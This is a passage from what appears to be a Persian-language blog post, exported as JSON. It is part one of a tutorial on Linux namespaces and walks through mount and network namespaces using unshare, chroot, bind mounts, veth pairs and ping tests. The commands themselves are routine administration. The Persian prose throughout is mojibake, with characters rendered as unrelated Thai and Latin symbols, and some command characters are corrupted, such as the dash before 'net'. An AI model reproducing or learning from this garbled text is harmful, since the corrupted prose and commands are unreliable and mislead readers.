ูพุงุฑุงูุชุฑ ุงุฌุฑุง ฺฉูู ููุฑุณุช ฺฉุงูู ุงุฒ mountูุง ูุฒุจุงู ุฑุง ูุดุงูุฏู ุฎูุงูู ฺฉุฑุฏ. ููุงูโุทูุฑ ฺฉู ุฏุฑ ููุฑุฏ ูุถุงูุงู PID ุงุดุงุฑู ฺฉุฑุฏูุ ุงูุชุธุงุฑ ุฏุงุฑู ุงู ููุงุฑุฏ ุงุฒ ุฏุฏ ฺฉ ฺฉุงูุชูุฑ ูุฎู ุดุฏู ุจุงุดุฏ. ูุดุงุจู ุดูุงุณูโ ูพุฑุฏุงุฒูโูุง ฺฉุฑูู ุงุฒ ูุณุฑ proc/ID/mounts/ ุงุทูุงุนุงุช ูุฑุจูุท ุจู mountูุง ูุฑ ูพุฑุฏุงุฒู ุฑุง ูโุฎูุงูุฏ. ุจูุงุจุฑุงู ููุช ฺฉู ฺฉ ูพุฑุฏุงุฒู ุจุง ฺฉ ูุถุงูุงู ุงุฎุชุตุงุต ุงุฌุงุฏ ฺฉูู ูู ููฺูุงู ุงุฒ ูุณุฑ proc/ ูุฒุจุงู ุงุณุชูุงุฏู ฺฉูุฏุ ูพุฑุฏุงุฒู ูโุชูุงูุฏ ุจู ุงุทูุงุนุงุช ูุฒุจุงู ุฏุณุชุฑุณ ุฏุงุดุชู ุจุงุดุฏ.\nุจุฑุง ุงุฒููู ฺฉุฑุฏู ฺฉ ูพุฑุฏุงุฒูโ ูุงุฒ ุงุณุช ฺฉู ุณุงุฎุช ฺฉ ูุถุงูุงู ุฌุฏุฏ ููุฑุงู ุจุง ุงุฌุงุฏ ฺฉ ูุงูโุณุณุชู root ู ฺฉ proc mount ุงูุฌุงู ุดูุฏ.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 $ sudo unshare --mount chroot alpine sh / # ls bin dev etc home lib media mnt opt proc root run sbin srv sys tmp usr var / # mount -t proc proc proc / # mount proc on /proc type proc (rw,relatime) / # mkdir src / # echo \u0026amp;quotsample\u0026amp;quot \u0026gt; src/test.txt / # mkdir dst / # mount --bind src dst / # ls dst test.txt / # cat dst/test.txt sample / # mount proc on /proc type proc (rw,relatime) /dev/sda1 on /dst type ext4 (rw,relatime,errors=remount-ro,data=ordered) / # ุจู ุทูุฑ ูุดุงุจู ููุช ุดูุง ฺฉ ุฏุงุฑฺฉุชูุฑ ุฏุฑ ุณุณุชู ูุฒุจุงู ุฑุง ุฏุฑ ฺฉ ฺฉุงูุชูุฑ mount ูโฺฉูุฏ (ูุซูุงู ุฏุฑ ุฏุงฺฉุฑ: docker run -v path_in_host:path_in_container) ุงุจุชุฏุง ูุงูโุณุณุชู root ฺฉุงูุชูุฑ ุฏุฑ ูุญู ููุงุณุจ ูุฑุงุฑ ูโฺฏุฑุฏ. ุณูพุณ ุฏุงุฑฺฉุชูุฑ ููุตุฏ ุฏุฑ ฺฉุงูุชูุฑ ุงุฌุงุฏ ุดุฏู ู ุฏุฑ ููุงุช ุฏุงุฑฺฉุชูุฑ ูุจุฏุฃ ุฏุฑ ููุตุฏ bind mount ูโุดูุฏ.\nูุถุงูุงู ุดุจฺฉู (Network) ฺฉ ุฏฺฏุฑ ุงุฒ ุณุทูุญ ุงุฒููู ฺฉุฑุฏูุ ูุฑุจูุท ุจู ูุถุง ุดุจฺฉู ูโุจุงุดุฏ. ูุถุงูุงู ุดุจฺฉู ุจู ูพุฑุฏุงุฒูโูุง ุงุฌุงุฒู ูโุฏูุฏ ฺฉู ุฏุฏ ุงุฎุชุตุงุต ูุณุจุช ุจู ฺฉุงุฑุช ุดุจฺฉู ู ุฌุฏูู ูุณุฑุงุจ ุฏุงุดุชู ุจุงุดูุฏ.\nุจุง ุงุณุชูุงุฏู ุงุฒ ุฏุณุชูุฑ ุฒุฑ ูโุชูุงู ฺฉ ูุถุงูุงู ุดุจฺฉู ุงุฌุงุฏ ฺฉุฑุฏ.\n1 $ sudo unshare โnet /bin/bash ุจุง ุงุณุชูุงุฏู ุงุฒ ุฏุณุชูุฑ lsns ู ุชุนู ููุน net ูโุชูุงูู ุฌุฒุฆุงุช ูุถุงูุงู ุงุฌุงุฏ ุดุฏู ุฑุง ุจุจูู. ุดูุงุณูโ ูพุฑุฏุงุฒู ุฑุง ุจู ุฎุงุทุฑ ุจุณูพุงุฑุฏ.\n1 2 3 4 5 root@Milad-PC:/tmp# lsns -t net NS TYPE NPROCS PID USER COMMAND ... 4026532516 net 2 5268 root /bin/bash ... ุจู ุตูุฑุช ูพุดโูุฑุถ ููุช ฺฉู ฺฉ ูพุฑุฏุงุฒู ุฑุง ุฏุฑ ูุถุงูุงู ุดุจฺฉูโ ูุฎุชุต ุจู ุฎูุฏุด ูุฑุงุฑ ูโุฏููุ ููุท ฺฉ ฺฉุงุฑุช ุดุจฺฉู loopback ุฏุงุฑุฏ.\n1 2 3 root@Milad-PC:~# ip a 1: lo: \u0026lt;LOOPBACK\u0026gt; mtu 65536 qdisc noop state DOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 ุจุฑุง ุงูฺฉู ูพุฑุฏุงุฒูโ ุฏุฑ ุญุงู ุงุฌุฑุง ุฏุฑ ฺฉุงูุชูุฑ ุจุชูุงูุฏ ุงูุชูุงู ุฏุงุฏู ุฏุงุดุชู ุจุงุดุฏ ุจุงุฏ ฺฉ ฺฉุงุฑุช ุดุจฺฉูโ ูุฌุงุฒ ุงุฌุงุฏ ฺฉูู ฺฉู ูุซู ุฏู ุณุฑ ฺฉ ฺฉุงุจู ุดุจฺฉู ุนูู ูโฺฉูุฏ. ุฏุฑโ ูุงูุน ูุถุงูุงู ุดุจฺฉูโ ุงุฎุชุตุงุต ุงุฌุงุฏ ุดุฏู ุจุฑุง ูพุฑุฏุงุฒู ุฑุง ุจู ูุถุงูุงู ุดุจฺฉู ูุฒุจุงู (ูพุดโูุฑุถ) ูุชุตู ูโฺฉูุฏ. ุจุฑุง ุงู ฺฉุงุฑ ุฏุฑ ฺฉ ุชุฑููุงู ุฏฺฏุฑ ุฏุณุชูุฑ ุฒุฑ ุฑุง ูุงุฑุฏ ูโฺฉูู:\n1 2 $ ip link add myeth1 netns 5268 type veth peer name myeth2 netns 1 ุงฺฏุฑ ุจุฎูุงูู ุฏุณุชูุฑ ุจุงูุง ุฑุง ุจู ุฒุจุงู ุณุงุฏู ุจุงู ฺฉููุ ip link add ุงุนูุงู ูโฺฉูุฏ ฺฉู ูโุฎูุงูู ฺฉ ุงุชุตุงู ุงุฌุงุฏ ฺฉูู ฺฉู ุฏุฑ ูุถุงูุงู ูุฑุจูุท ุจู ูพุฑุฏุงุฒูโ ตฒถธ ฺฉ ฺฉุงุฑุช ุดุจฺฉูโ ูุฌุงุฒ ุจู ุงุณู myeth1 ุงุฌุงุฏ ฺฉูุฏ ู ุขู ุฑุง ุจู ูุถุงูุงู ูพุฑุฏุงุฒูโ ฑ ูุตู ฺฉูุฏ ู ูุงู ฺฉุงุฑุช ุดุจฺฉูโ ูุฌุงุฒ ุฑุง myeth2 ุชูุธู ฺฉูุฏ.\nุญุงูุง ุงฺฏุฑ ุฏุฑ ฺฉ ุชุฑููุงู ุฏุฑ ูุฒุจุงู ู ููฺูู ุฏุฑ ุฏุงุฎู ูุถุงูุงู ุฌุฏุฏ ููุฑุณุช ฺฉุงุฑุช ุดุจฺฉูโูุง ุฑุง ุจุฑุฑุณ ฺฉูู ุงู ุฏู ฺฉุงุฑุช ุดุจฺฉู ุฑุง ุฎูุงูู ุฏุฏ.\nุฏุฑ ุฏุงุฎู ูุถุงูุงู ุดุจฺฉูโ ุฌุฏุฏ:\n1 2 3 4 root@Milad-PC:/tmp# ip a 1: lo: \u0026lt;LOOPBACK\u0026gt; mtu 65536 qdisc noop state DOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 2: myveth1@if18: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 5e:f7:93:bf:19:80 brd ff:ff:ff:ff:ff:ff link-netnsid 0 ุฏุฑ ุฏุงุฎู ูุฒุจุงู:\n1 2 3 4 $ ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever โฆ 18: myveth2@if2: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether ea:4d:95:01:8c:db brd ff:ff:ff:ff:ff:ff link-netnsid 1 ุฏุฑ ุญุงูุช ูุนู ูุฑ ุฏู ฺฉุงุฑุช ุดุจฺฉูโ ุฌุฏุฏ ุฏุฑ ูุถุนุช Down ูุณุชูุฏ ู ุจุฑุง ุงูฺฉู ุงูฺฉุงู ุงูุชูุงู ุฏุงุฏู ูุฑุงูู ุดูุฏ ุจุงุฏ ูุถุนุช ูุฑ ุฏู ฺฉุงุฑุช ุจู Up ุชุบุฑ ฺฉูุฏ ู ุจู ุขูโูุง ุขุฏุฑุณ IP ุชุฎุตุต ุฏุงุฏู ุดูุฏ.\nุฏุฑ ุชุฑููุงู ูุฒุจุงู:\n1 2 3 4 $ sudo ip link set myveth2 up $ sudo ip addr add 192.168.30.100/24 dev myveth2 $ ip a s myveth2 18: myveth2@if2: \u0026lt;NO-CARRIER,BROADCAST,MULTICAST,UP\u0026gt; mtu 1500 qdisc noqueue state LOWERLAYERDOWN group default qlen 1000 link/ether ea:4d:95:01:8c:db brd ff:ff:ff:ff:ff:ff link-netnsid 1 inet 192.168.30.100/24 scope global myveth2 valid_lft forever preferred_lft forever ุฏุฑ ูุถุงูุงู ุฌุฏุฏ:\n1 2 3 4 5 $ sudo ip link set myveth1 up $ sudo ip addr add 192.168.30.101/24 dev myveth1 $ ip a s myveth1 2: myveth1@if18: \u0026lt;BROADCAST,MULTICAST\u0026gt; mtu 1500 qdisc noop state DOWN group default qlen 1000 link/ether 5e:f7:93:bf:19:80 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 192.168.30.101/24 scope global myveth1valid_lft forever preferred_lft forever ููุงูโุทูุฑ ฺฉู ุงุดุงุฑู ฺฉุฑุฏู ุจุง ุงุฌุงุฏ ฺฉ ูุถุงูุงู ุดุจฺฉูุ ุฌุฏูู ูุณุฑโุงุจ ู ฺฉุงุฑุช ุดุจฺฉูโูุง ุงุฒููู ุฎูุงูุฏ ุดุฏ ู ูพุฑุฏุงุฒูโ ููุฌูุฏ ุฏุฑ ฺฉุงูุชูุฑ ุจู ุงุทูุงุนุงุช ูุฒุจุงู ุฏุณุชุฑุณ ูุฎูุงูุฏ ุฏุงุดุช.\n1 2 root@Milad-PC:/tmp# ip route 192.168.30.0/24 dev myveth1 proto kernel scope link src 192.168.30.101 ุญุงูุง ูู ุฏุฑ ุชุฑููุงู ูุงุดู ูุฒุจุงู ู ูู ุฏุฑ ูุถุงูุงู ุฌุฏุฏ ูโุชูุงูู ุงุชุตุงู ุฑุง ุชุณุช ฺฉูู. ุฏุฑ ุชุฑููุงู ูุงุดู ูุฒุจุงู ุงู ุฏุณุชูุฑ ุฑุง ุงุฌุฑุง ฺฉูุฏ:\n1 2 3 4 5 6 7 8 $ ping 192.168.30.101 PING 192.168.30.101 (192.168.30.101) 56(84) bytes of data. 64 bytes from 192.168.30.101: icmp_seq=1 ttl=64 time=0.043 ms 64 bytes from 192.168.30.101: icmp_seq=2 ttl=64 time=0.079 ms ^C --- 192.168.30.101 ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1020ms rtt min/avg/max/mdev = 0.043/0.061/0.079/0.018 ms ูููโุทูุฑ ุฏุฑ ูุถุงูุงู:\n1 2 3 4 5 6 7 8 root@Milad-PC:/tmp# ping 192.168.30.100 PING 192.168.30.100 (192.168.30.100) 56(84) bytes of data. 64 bytes from 192.168.30.100: icmp_seq=1 ttl=64 time=0.078 ms 64 bytes from 192.168.30.100: icmp_seq=2 ttl=64 time=0.100 ms ^C --- 192.168.30.100 ping statistics --- 2 packets transmitted, 2 received, 0% packet loss, time 1015ms rtt min/avg/max/mdev = 0.078/0.089/0.100/0.011 ms ูุทุงุจู ุฎุฑูุฌ ุจุงูุง ูโุจูู ฺฉู ุงุชุตุงู ุจู ุฏู ุทุฑู ุจุฑูุฑุงุฑ ุดุฏู ุงุณุช.\nุฏุฑ ูุณูุช ุงูู ุจุง ูุถุงูุงูโูุง utsุ pidุ mount ู network ุขุดูุง ุดุฏู. ุฏุฑ ูุณูุช ุฏูู ุงู ููุดุชุงุฑ ูุถุงูุงูโูุง userุ ipcุ cgroup ู time ุฑุง ููุฑุฏ ุจุฑุฑุณ ูุฑุงุฑ ุฏุงุฏูโุงู.\n","date":"2021-03-02T13:04:26Z","image":"https://fa.miladbr.uk/p/%D9%81%D8%B6%D8%A7%D9%86%D8%A7%D9%85%D9%87%D8%A7-%D8%AF%D8%B1-%D9%84%DB%8C%D9%86%D9%88%DA%A9%D8%B3-%DB%B1/cover_hu_5bb89bee8bf26b56.png","permalink":"https://fa.miladbr.uk/p/%D9%81%D8%B6%D8%A7%D9%86%D8%A7%D9%85%D9%87%D8%A7-%D8%AF%D8%B1-%D9%84%DB%8C%D9%86%D9%88%DA%A9%D8%B3-%DB%B1/","title":"ูุถุงูุงูโูุง ู ุงุฒููู ฺฉุฑุฏู ูพุฑุฏุงุฒูโูุง ุฏุฑ ูููฺฉุณ โ ูุณูุช ุงูู"}]